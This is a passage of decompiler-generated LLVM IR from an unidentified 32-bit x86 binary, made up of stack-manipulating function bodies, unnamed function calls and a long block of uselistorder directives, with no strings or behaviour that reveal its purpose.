  %v2_804f5db = add i32 %v0_804f5cf, 4
  %v3_804f5db = inttoptr i32 %v2_804f5db to i32*
  store i32 %v0_804f5db, i32* %v3_804f5db, align 4
  %v0_804f5dc = load i32, i32* @ebp, align 4
  %v3_804f5dc = inttoptr i32 %v0_804f5cf to i32*
  store i32 %v0_804f5dc, i32* %v3_804f5dc, align 4
  %v3_804f5dd = call i32 @function_805085c(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f5e2 = load i32, i32* @esp, align 4
  %v1_804f5e2 = add i32 %v0_804f5e2, 16
  %v1_804f5e5 = add i32 %v3_804f5dd, 1
  %v8_804f5e5 = icmp eq i32 %v1_804f5e5, 0
  store i32 %v1_804f5e5, i32* %eax.global-to-local, align 4
  %v1_804f5e6 = icmp eq i1 %v8_804f5e5, false
  br i1 %v1_804f5e6, label %dec_label_pc_804f5fd, label %dec_label_pc_804f5eb

dec_label_pc_804f5eb:                             ; preds = %dec_label_pc_804f57f, %dec_label_pc_804f5fd
  %storemerge4.in = phi i32 [ %v0_804f6a8, %dec_label_pc_804f5fd ], [ %v0_804f5e2, %dec_label_pc_804f57f ]
  %v0_804f5eb = load i32, i32* @ebp, align 4
  %v3_804f5eb = inttoptr i32 %storemerge4.in to i32*
  store i32 %v0_804f5eb, i32* %v3_804f5eb, align 4
  %v1_804f5ec = call i32 @function_8050253(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f5ec, i32* @eax, align 4
  %v0_804f5f1 = load i32, i32* @esp, align 4
  %v1_804f5f1 = inttoptr i32 %v0_804f5f1 to i32*
  store i32 0, i32* %v1_804f5f1, align 4
  %v1_804f5f8 = call i32 @function_8051d73(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f5f8, i32* %eax.global-to-local, align 4
  %v0_804f5fd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f5fd

dec_label_pc_804f5fd:                             ; preds = %dec_label_pc_804f57f, %dec_label_pc_804f5eb
  %v0_804f5fd = phi i32 [ %v1_804f5e2, %dec_label_pc_804f57f ], [ %v0_804f5fd.pre, %dec_label_pc_804f5eb ]
  %v1_804f5fd = add i32 %v0_804f5fd, 1864
  %v2_804f5fd = inttoptr i32 %v1_804f5fd to i8*
  store i8 0, i8* %v2_804f5fd, align 1
  %v0_804f605 = load i32, i32* @esp, align 4
  %v1_804f605 = add i32 %v0_804f605, -4
  %v2_804f605 = inttoptr i32 %v1_804f605 to i32*
  store i32 16384, i32* %v2_804f605, align 4
  %v1_804f60a = add i32 %v0_804f605, -8
  %v2_804f60a = inttoptr i32 %v1_804f60a to i32*
  store i32 1, i32* %v2_804f60a, align 4
  %v1_804f60c = add i32 %v0_804f605, 1864
  store i32 %v1_804f60c, i32* %eax.global-to-local, align 4
  %v2_804f613 = add i32 %v0_804f605, -12
  %v3_804f613 = inttoptr i32 %v2_804f613 to i32*
  store i32 %v1_804f60c, i32* %v3_804f613, align 4
  %v0_804f614 = load i32, i32* @ebp, align 4
  %v2_804f614 = add i32 %v0_804f605, -16
  %v3_804f614 = inttoptr i32 %v2_804f614 to i32*
  store i32 %v0_804f614, i32* %v3_804f614, align 4
  %v0_804f615 = call i32 @function_8050986()
  %v0_804f61a = load i32, i32* @esp, align 4
  %v1_804f61a = add i32 %v0_804f61a, -4
  %v2_804f61a = inttoptr i32 %v1_804f61a to i32*
  store i32 16384, i32* %v2_804f61a, align 4
  %v1_804f61f = add i32 %v0_804f61a, -8
  %v2_804f61f = inttoptr i32 %v1_804f61f to i32*
  store i32 4, i32* %v2_804f61f, align 4
  %v1_804f621 = add i32 %v0_804f61a, 1888
  store i32 %v1_804f621, i32* %eax.global-to-local, align 4
  %v2_804f628 = add i32 %v0_804f61a, -12
  %v3_804f628 = inttoptr i32 %v2_804f628 to i32*
  store i32 %v1_804f621, i32* %v3_804f628, align 4
  %v0_804f629 = load i32, i32* @ebp, align 4
  %v2_804f629 = add i32 %v0_804f61a, -16
  %v3_804f629 = inttoptr i32 %v2_804f629 to i32*
  store i32 %v0_804f629, i32* %v3_804f629, align 4
  %v0_804f62a = call i32 @function_8050986()
  %v0_804f62f = load i32, i32* @esp, align 4
  %v1_804f632 = add i32 %v0_804f62f, 28
  %v2_804f632 = inttoptr i32 %v1_804f632 to i32*
  store i32 16384, i32* %v2_804f632, align 4
  %v1_804f637 = add i32 %v0_804f62f, 24
  %v2_804f637 = inttoptr i32 %v1_804f637 to i32*
  store i32 2, i32* %v2_804f637, align 4
  %v1_804f639 = add i32 %v0_804f62f, 1914
  store i32 %v1_804f639, i32* %eax.global-to-local, align 4
  %v2_804f640 = add i32 %v0_804f62f, 20
  %v3_804f640 = inttoptr i32 %v2_804f640 to i32*
  store i32 %v1_804f639, i32* %v3_804f640, align 4
  %v0_804f641 = load i32, i32* @ebp, align 4
  %v2_804f641 = add i32 %v0_804f62f, 16
  %v3_804f641 = inttoptr i32 %v2_804f641 to i32*
  store i32 %v0_804f641, i32* %v3_804f641, align 4
  %v0_804f642 = call i32 @function_8050986()
  store i32 %v0_804f642, i32* %eax.global-to-local, align 4
  %v0_804f647 = load i32, i32* @esp, align 4
  %v1_804f647 = add i32 %v0_804f647, -4
  %v2_804f647 = inttoptr i32 %v1_804f647 to i32*
  store i32 16384, i32* %v2_804f647, align 4
  %v1_804f64c = add i32 %v0_804f647, -8
  %v2_804f64c = inttoptr i32 %v1_804f64c to i32*
  store i32 1, i32* %v2_804f64c, align 4
  %v1_804f64e = add i32 %v0_804f647, 52
  %v2_804f64e = inttoptr i32 %v1_804f64e to i32*
  %v3_804f64e = load i32, i32* %v2_804f64e, align 4
  %v1_804f652 = add i32 %v3_804f64e, 12
  store i32 %v1_804f652, i32* %eax.global-to-local, align 4
  %v2_804f655 = add i32 %v0_804f647, -12
  %v3_804f655 = inttoptr i32 %v2_804f655 to i32*
  store i32 %v1_804f652, i32* %v3_804f655, align 4
  %v0_804f656 = load i32, i32* @ebp, align 4
  %v2_804f656 = add i32 %v0_804f647, -16
  %v3_804f656 = inttoptr i32 %v2_804f656 to i32*
  store i32 %v0_804f656, i32* %v3_804f656, align 4
  %v0_804f657 = call i32 @function_8050986()
  %v0_804f65c = load i32, i32* @esp, align 4
  %v1_804f65f = add i32 %v0_804f65c, 28
  %v2_804f65f = inttoptr i32 %v1_804f65f to i32*
  store i32 16384, i32* %v2_804f65f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f666 = add i32 %v0_804f65c, 68
  %v2_804f666 = inttoptr i32 %v1_804f666 to i32*
  %v3_804f666 = load i32, i32* %v2_804f666, align 4
  store i32 %v3_804f666, i32* %edx.global-to-local, align 4
  %v1_804f66a = add i32 %v3_804f666, 12
  %v2_804f66a = inttoptr i32 %v1_804f66a to i8*
  %v3_804f66a = load i8, i8* %v2_804f66a, align 1
  %v4_804f66a = zext i8 %v3_804f66a to i32
  store i32 %v4_804f66a, i32* %eax.global-to-local, align 4
  %v2_804f66d = add i32 %v0_804f65c, 24
  %v3_804f66d = inttoptr i32 %v2_804f66d to i32*
  store i32 %v4_804f66a, i32* %v3_804f66d, align 4
  %v0_804f66e = load i32, i32* %edx.global-to-local, align 4
  %v1_804f66e = inttoptr i32 %v0_804f66e to i32*
  %v2_804f66e = load i32, i32* %v1_804f66e, align 4
  store i32 %v2_804f66e, i32* %eax.global-to-local, align 4
  %v2_804f670 = add i32 %v0_804f65c, 20
  %v3_804f670 = inttoptr i32 %v2_804f670 to i32*
  store i32 %v2_804f66e, i32* %v3_804f670, align 4
  %v0_804f671 = load i32, i32* @ebp, align 4
  %v2_804f671 = add i32 %v0_804f65c, 16
  %v3_804f671 = inttoptr i32 %v2_804f671 to i32*
  store i32 %v0_804f671, i32* %v3_804f671, align 4
  %v0_804f672 = call i32 @function_8050986()
  store i32 %v0_804f672, i32* %eax.global-to-local, align 4
  %v0_804f677 = load i32, i32* @esp, align 4
  %v1_804f677 = add i32 %v0_804f677, -4
  %v2_804f677 = inttoptr i32 %v1_804f677 to i32*
  store i32 16384, i32* %v2_804f677, align 4
  %v1_804f67c = add i32 %v0_804f677, -8
  %v2_804f67c = inttoptr i32 %v1_804f67c to i32*
  store i32 1, i32* %v2_804f67c, align 4
  %v1_804f67e = add i32 %v0_804f677, 52
  %v2_804f67e = inttoptr i32 %v1_804f67e to i32*
  %v3_804f67e = load i32, i32* %v2_804f67e, align 4
  %v1_804f682 = add i32 %v3_804f67e, 13
  store i32 %v1_804f682, i32* %eax.global-to-local, align 4
  %v2_804f685 = add i32 %v0_804f677, -12
  %v3_804f685 = inttoptr i32 %v2_804f685 to i32*
  store i32 %v1_804f682, i32* %v3_804f685, align 4
  %v0_804f686 = load i32, i32* @ebp, align 4
  %v2_804f686 = add i32 %v0_804f677, -16
  %v3_804f686 = inttoptr i32 %v2_804f686 to i32*
  store i32 %v0_804f686, i32* %v3_804f686, align 4
  %v0_804f687 = call i32 @function_8050986()
  %v0_804f68c = load i32, i32* @esp, align 4
  %v1_804f68f = add i32 %v0_804f68c, 28
  %v2_804f68f = inttoptr i32 %v1_804f68f to i32*
  store i32 16384, i32* %v2_804f68f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f696 = add i32 %v0_804f68c, 68
  %v2_804f696 = inttoptr i32 %v1_804f696 to i32*
  %v3_804f696 = load i32, i32* %v2_804f696, align 4
  store i32 %v3_804f696, i32* %ecx.global-to-local, align 4
  %v1_804f69a = add i32 %v3_804f696, 13
  %v2_804f69a = inttoptr i32 %v1_804f69a to i8*
  %v3_804f69a = load i8, i8* %v2_804f69a, align 1
  %v4_804f69a = zext i8 %v3_804f69a to i32
  store i32 %v4_804f69a, i32* %eax.global-to-local, align 4
  %v2_804f69d = add i32 %v0_804f68c, 24
  %v3_804f69d = inttoptr i32 %v2_804f69d to i32*
  store i32 %v4_804f69a, i32* %v3_804f69d, align 4
  %v0_804f69e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f69e = add i32 %v0_804f69e, 4
  %v2_804f69e = inttoptr i32 %v1_804f69e to i32*
  %v3_804f69e = load i32, i32* %v2_804f69e, align 4
  store i32 %v3_804f69e, i32* %eax.global-to-local, align 4
  %v2_804f6a1 = add i32 %v0_804f68c, 20
  %v3_804f6a1 = inttoptr i32 %v2_804f6a1 to i32*
  store i32 %v3_804f69e, i32* %v3_804f6a1, align 4
  %v0_804f6a2 = load i32, i32* @ebp, align 4
  %v2_804f6a2 = add i32 %v0_804f68c, 16
  %v3_804f6a2 = inttoptr i32 %v2_804f6a2 to i32*
  store i32 %v0_804f6a2, i32* %v3_804f6a2, align 4
  %v0_804f6a3 = call i32 @function_8050986()
  store i32 %v0_804f6a3, i32* %eax.global-to-local, align 4
  %v0_804f6a8 = load i32, i32* @esp, align 4
  %v1_804f6a8 = inttoptr i32 %v0_804f6a8 to i32*
  %v2_804f6a8 = load i32, i32* %v1_804f6a8, align 4
  store i32 %v2_804f6a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5eb

; uselistorder directives
  uselistorder i32 %v0_804f6a8, { 1, 0 }
  uselistorder i32 %v4_804f69a, { 1, 0 }
  uselistorder i32 %v4_804f66a, { 1, 0 }
  uselistorder i32 %v0_804f5ab, { 0, 2, 1 }
  uselistorder i64 %v8_804f599, { 1, 0 }
  uselistorder i32 %v1_804f58c, { 1, 0 }
  uselistorder i32 %v0_804f567, { 0, 2, 1 }
  uselistorder i32* %v2_804e5c8, { 1, 0 }
  uselistorder i32 %v0_804e9ec, { 1, 0 }
  uselistorder i32 %v5_804ea81, { 1, 0 }
  uselistorder i32 %v4_804ea81.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ea81, { 2, 1, 0 }
  uselistorder i32 %v0_804f3f3, { 1, 0, 2 }
  uselistorder i32 %v3_804f3c1, { 2, 1, 0 }
  uselistorder i32 %v0_804f3be, { 0, 2, 1 }
  uselistorder i32 %v0_804f398, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f293, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f267, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f1ae, { 1, 2, 0 }
  uselistorder i32 %v0_804f110, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f07c, { 1, 2, 0 }
  uselistorder i32 %v0_804f4ab, { 1, 0 }
  uselistorder i32 %v2_804efa4, { 1, 0, 2 }
  uselistorder i32 %v1_804efa1, { 1, 0, 2 }
  uselistorder i32 %v0_804ef9a, { 1, 2, 0 }
  uselistorder i32 %v9_804ee8b, { 1, 0 }
  uselistorder i32 %v1_804ee84, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804ee5e, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_804edd0, { 1, 0 }
  uselistorder i32 %v1_804edc9, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804eda3, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_804ed76, { 1, 2, 0 }
  uselistorder i32 %v4_804ed76, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804ed71, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_804f34b, { 1, 0 }
  uselistorder i32* %v1_804f37b, { 2, 0, 1 }
  uselistorder i32 %v0_804ed06, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v9_804ec60, { 1, 0 }
  uselistorder i32 %v1_804ec59, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804ec33, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804ec22, { 2, 1, 0 }
  uselistorder i32 %v9_804ebf1, { 1, 0 }
  uselistorder i32 %v0_804f1a2, { 0, 2, 1 }
  uselistorder i32 %v1_804ebdd, { 2, 1, 0 }
  uselistorder i32 %v9_804ebac, { 1, 0 }
  uselistorder i32 %v0_804f070, { 0, 2, 1 }
  uselistorder i32 %v1_804eb94, { 2, 1, 0 }
  uselistorder i32 %v9_804eb6c, { 1, 0 }
  uselistorder i32 %v0_804f0e9, { 0, 2, 1 }
  uselistorder i32 %v1_804eb58, { 2, 1, 0 }
  uselistorder i32 %v9_804eb27, { 1, 0 }
  uselistorder i32 %v0_804f21f, { 0, 2, 1 }
  uselistorder i32 %v5_804eafd, { 1, 0 }
  uselistorder i32 %v4_804eafd, { 0, 2, 1 }
  uselistorder i8* %v2_804eac5, { 1, 0, 2 }
  uselistorder i8* %v1_804eab3, { 1, 0, 2 }
  uselistorder i32 %v1_804ea90, { 1, 0, 2 }
  uselistorder i32 %v1_804ef20, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v3_804ea62, { 1, 0 }
  uselistorder i32 %v0_804ea62, { 0, 13, 1, 11, 2, 10, 3, 12, 4, 9, 5, 8, 6, 7, 14 }
  uselistorder i32 %v1_804ea4d, { 0, 2, 1 }
  uselistorder i32 %v0_804ea49, { 1, 0 }
  uselistorder i32 %v0_804ea30, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v0_804e9c3, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804e9c2, { 1, 0, 2 }
  uselistorder i16 %v1_804e9ce, { 1, 0 }
  uselistorder i64 %v8_804e9af, { 1, 0 }
  uselistorder i32 %v0_804e937, { 2, 0, 1 }
  uselistorder i32 %v1_804e934, { 1, 0 }
  uselistorder i32 %v2_804e931, { 1, 0 }
  uselistorder i32 %v3_804e925, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v1_804e90c, { 1, 0 }
  uselistorder i32 %v0_804e90c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e8e7, { 1, 0 }
  uselistorder i32 %v2_804e8e4, { 1, 0 }
  uselistorder i32 %v0_804e8e2, { 1, 0 }
  uselistorder i32 %v2_804e898, { 1, 0 }
  uselistorder i32 %v2_804e855, { 1, 0 }
  uselistorder i32 %v3_804e852, { 1, 0, 2, 3 }
  uselistorder i1 %v9_804e7e2, { 1, 0 }
  uselistorder i32 %v1_804e7e2, { 1, 0 }
  uselistorder i32 %v3_804e7df, { 1, 0, 2 }
  uselistorder i32 %v2_804e7dd, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_804e7c2, { 1, 0 }
  uselistorder i32 %v0_804e7c2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e7ad, { 1, 0 }
  uselistorder i32 %v3_804e7aa, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e847, { 1, 0 }
  uselistorder i32 %v1_804e844, { 2, 1, 0 }
  uselistorder i32 %v1_804e748, { 1, 0 }
  uselistorder i32 %v1_804e73d, { 1, 0 }
  uselistorder i32 %v0_804e73d, { 1, 0 }
  uselistorder i32 %v0_804e746, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e71a, { 1, 0 }
  uselistorder i32 %v0_804e71a, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_804e70c, { 1, 0, 2 }
  uselistorder i32 %v4_804e6cf, { 2, 1, 0 }
  uselistorder i32 %v3_804e69e, { 1, 0, 2 }
  uselistorder i32 %v0_804e5e2, { 0, 2, 1 }
  uselistorder i32 %v0_804e5d9, { 0, 3, 1, 2 }
  uselistorder i8 %v1_804e5b2, { 1, 0 }
  uselistorder i32 %v0_804e5bb, { 1, 0 }
  uselistorder i8 %v1_804e58d, { 1, 0 }
  uselistorder i8 %v2_804e567, { 1, 5, 6, 0, 3, 4, 2 }
  uselistorder i32 %v2_804e55e, { 10, 4, 9, 6, 1, 0, 2, 3, 7, 5, 8 }
  uselistorder i32 %v5_804e55c, { 0, 5, 4, 7, 6, 2, 3, 1 }
  uselistorder i32 %v1_804e556, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804e551, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e505, { 1, 0 }
  uselistorder i32 %v0_804e455, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804e450, { 1, 0 }
  uselistorder i32 %v1_804e42d, { 2, 1, 0 }
  uselistorder i32 %v0_804e415, { 3, 5, 2, 4, 0, 1 }
  uselistorder i32 %v0_804e340, { 2, 0, 1 }
  uselistorder i32 %v0_804e304, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 37, 38, 6, 7, 8, 59, 9, 10, 11, 12, 28, 29, 30, 56, 18, 22, 23, 24, 25, 26, 20, 34, 35, 36, 60, 58, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 19, 21, 27, 57, 31, 32, 33, 52, 53, 54, 55, 39, 40, 43, 41, 42, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i32* %ecx.global-to-local, { 13, 14, 2, 11, 12, 3, 9, 35, 36, 6, 7, 8, 37, 0, 1, 4, 5, 10, 31, 32, 33, 34, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 24, 25, 26, 27, 28, 29, 32, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 161, 162, 127, 163, 164, 244, 128, 129, 268, 269, 270, 271, 272, 47, 48, 51, 49, 50, 52, 53, 54, 55, 56, 106, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 256, 257, 258, 259, 260, 261, 262, 263, 264, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 95, 96, 97, 98, 99, 100, 101, 102, 103, 165, 166, 167, 168, 247, 169, 170, 171, 172, 173, 274, 275, 276, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 148, 149, 150, 151, 152, 58, 59, 60, 61, 62, 63, 57, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 93, 94, 104, 105, 125, 126, 265, 266, 153, 154, 155, 156, 157, 273, 158, 159, 267, 174, 175, 176, 177, 178, 179, 245, 246, 248, 249, 250, 251, 252, 253, 254, 194, 195, 242, 243, 160, 255, 193, 196, 197, 198, 201, 199, 200, 202, 204, 205, 206, 207, 211, 213, 212, 208, 209, 210, 203, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 45, 239, 241, 240, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238 }
  uselistorder i32 ()* @function_804fde0, { 4, 1, 0, 2, 3 }
  uselistorder i32 1880, { 11, 9, 14, 0, 1, 5, 6, 13, 2, 3, 4, 15, 7, 8, 12, 10 }
  uselistorder i32 ()* @function_804f6e0, { 13, 5, 4, 12, 7, 3, 2, 1, 0, 9, 6, 8, 15, 14, 11, 10 }
  uselistorder i32 ()* @function_804f6b0, { 9, 8, 7, 1, 0, 4, 2, 3, 11, 10, 6, 5 }
  uselistorder i32 1888, { 4, 2, 3, 0, 1 }
  uselistorder i32 ()* @function_804f760, { 8, 7, 1, 0, 4, 2, 3, 10, 9, 6, 5 }
  uselistorder i8 58, { 9, 0, 8, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_8050986, { 7, 6, 5, 4, 3, 2, 20, 1, 0, 10, 9, 16, 15, 12, 11, 14, 13, 24, 23, 22, 21, 18, 17, 8, 19 }
  uselistorder i8 -5, { 2, 3, 0, 1 }
  uselistorder i8 -3, { 4, 5, 6, 3, 0, 1, 2 }
  uselistorder i32 1864, { 0, 2, 3, 1, 4 }
  uselistorder i32 1872, { 1, 0, 2 }
  uselistorder i32 1572, { 1, 0, 2 }
  uselistorder i32 1700, { 1, 0, 2 }
  uselistorder i32 ()* @function_804de10, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0, 2 }
  uselistorder i32 -20, { 1, 0, 2 }
  uselistorder i8 31, { 1, 2, 3, 0 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 10, { 1, 2, 3, 0 }
  uselistorder i8 127, { 1, 0 }
  uselistorder i32 (i32)* @function_804d700, { 4, 0, 2, 1, 3 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_80543d6.13, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 2, 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f5fd, { 1, 0 }
  uselistorder label %dec_label_pc_804f5eb, { 1, 0 }
  uselistorder label %dec_label_pc_804f48b, { 1, 0 }
  uselistorder label %dec_label_pc_804e9ec.backedge, { 21, 7, 15, 10, 14, 0, 12, 1, 3, 16, 4, 5, 18, 6, 8, 19, 9, 17, 11, 20, 13, 2 }
  uselistorder label %dec_label_pc_804f400, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f2e7, { 1, 0 }
  uselistorder label %dec_label_pc_804f22b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f158, { 1, 0 }
  uselistorder label %dec_label_pc_804f0f5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f058, { 2, 7, 4, 6, 5, 0, 1, 3, 8 }
  uselistorder label %dec_label_pc_804efe6, { 1, 0 }
  uselistorder label %dec_label_pc_804ee99, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ee75, { 1, 0 }
  uselistorder label %dec_label_pc_804edde, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804edba, { 1, 0 }
  uselistorder label %dec_label_pc_804ed80, { 1, 0 }
  uselistorder label %dec_label_pc_804ed71, { 3, 4, 9, 6, 8, 7, 0, 1, 2, 11, 5, 10 }
  uselistorder label %dec_label_pc_804ec6e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ec4a, { 1, 0 }
  uselistorder label %dec_label_pc_804ebf1, { 1, 0 }
  uselistorder label %dec_label_pc_804ebac, { 1, 0 }
  uselistorder label %dec_label_pc_804eb6c, { 1, 0 }
  uselistorder label %dec_label_pc_804eb27, { 1, 0 }
  uselistorder label %dec_label_pc_804eb03, { 1, 2, 5, 3, 4, 6, 0 }
  uselistorder label %dec_label_pc_804ead8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eac5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eab3, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804ea87, { 1, 0 }
  uselistorder label %dec_label_pc_804ea87.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ea52, { 1, 0 }
  uselistorder label %dec_label_pc_804ea4d, { 1, 0 }
  uselistorder label %dec_label_pc_804ea0b, { 1, 0 }
  uselistorder label %dec_label_pc_804e9f7, { 1, 0 }
  uselistorder label %dec_label_pc_804e8fd, { 5, 6, 0, 7, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804e8e2, { 1, 0 }
  uselistorder label %dec_label_pc_804e8ba, { 1, 0 }
  uselistorder label %dec_label_pc_804e7e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e7b3, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder label %dec_label_pc_804e766, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e73d, { 1, 0 }
  uselistorder label %dec_label_pc_804e656, { 9, 1, 2, 3, 4, 5, 0, 6, 7, 8, 10 }
  uselistorder label %dec_label_pc_804e64b, { 1, 0 }
  uselistorder label %dec_label_pc_804e5eb, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e5d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e59b, { 1, 0 }
  uselistorder label %dec_label_pc_804e551, { 6, 7, 0, 1, 2, 5, 4, 3, 8 }
  uselistorder label %dec_label_pc_804e551.preheader, { 21, 17, 20, 16, 19, 15, 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 18 }
  uselistorder label %dec_label_pc_804e39f, { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_804e352, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804e340, { 1, 2, 0 }
}

define i32 @function_804f6b0() local_unnamed_addr {
dec_label_pc_804f6b0:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_804f6b8 = icmp eq i32 %tmp, 0
  %v1_804f6ba = mul i32 %tmp2, 8
  store i32 %v1_804f6ba, i32* %edx.global-to-local, align 4
  br i1 %v1_804f6b8, label %dec_label_pc_804f6d3, label %dec_label_pc_804f6c9

dec_label_pc_804f6c9:                             ; preds = %dec_label_pc_804f6b0
  %v1_804f6c9 = add i32 %v1_804f6ba, add (i32 ptrtoint (i32* @global_var_8054460.28 to i32), i32 4)
  %v2_804f6c9 = inttoptr i32 %v1_804f6c9 to i32*
  %v3_804f6c9 = load i32, i32* %v2_804f6c9, align 4
  %v1_804f6cc = urem i32 %v3_804f6c9, 65536
  %v2_804f6d1 = inttoptr i32 %tmp to i32*
  store i32 %v1_804f6cc, i32* %v2_804f6d1, align 4
  %v0_804f6d3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f6d3

dec_label_pc_804f6d3:                             ; preds = %dec_label_pc_804f6b0, %dec_label_pc_804f6c9
  %v0_804f6d3 = phi i32 [ %v1_804f6ba, %dec_label_pc_804f6b0 ], [ %v0_804f6d3.pre, %dec_label_pc_804f6c9 ]
  %v1_804f6d3 = add i32 %v0_804f6d3, ptrtoint (i32* @global_var_8054460.28 to i32)
  %v2_804f6d3 = inttoptr i32 %v1_804f6d3 to i32*
  %v3_804f6d3 = load i32, i32* %v2_804f6d3, align 4
  ret i32 %v3_804f6d3

; uselistorder directives
  uselistorder label %dec_label_pc_804f6d3, { 1, 0 }
}

define i32 @function_804f6e0() local_unnamed_addr {
dec_label_pc_804f6e0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f6e9 = zext i8 %tmp to i32
  %v1_804f6ed = mul nuw nsw i32 %v4_804f6e9, 8
  %v2_804f6ed = add i32 %v1_804f6ed, ptrtoint (i32* @global_var_8054460.28 to i32)
  store i32 %v2_804f6ed, i32* %ecx.global-to-local, align 4
  %v0_804f6f4 = load i16, i16* @global_var_80542fc.29, align 2
  %v1_804f6f4 = sext i16 %v0_804f6f4 to i32
  %v1_804f6f9 = add i32 %v1_804f6ed, add (i32 ptrtoint (i32* @global_var_8054460.28 to i32), i32 4)
  %v2_804f6f9 = inttoptr i32 %v1_804f6f9 to i16*
  %v3_804f6f9 = load i16, i16* %v2_804f6f9, align 4
  %v4_804f6f9 = icmp eq i16 %v3_804f6f9, 0
  br i1 %v4_804f6f9, label %dec_label_pc_804f74a, label %dec_label_pc_804f700

dec_label_pc_804f700:                             ; preds = %dec_label_pc_804f6e0
  store i32 %v1_804f6f4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804f708 = udiv i32 %v1_804f6f4, 16777216
  %v2_804f70b = udiv i32 %v1_804f6f4, 256
  store i32 %v2_804f70b, i32* %edi.global-to-local, align 4
  %v5_804f70e = trunc i32 %v2_804f708 to i8
